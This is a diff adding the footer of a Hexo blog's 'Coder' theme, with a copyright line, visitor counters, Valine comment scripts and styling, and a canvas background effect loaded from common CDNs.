+    <div class="footer" id="footer">
+    <p><h4>Copyright © 2020 | Author: Dawn Nine | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
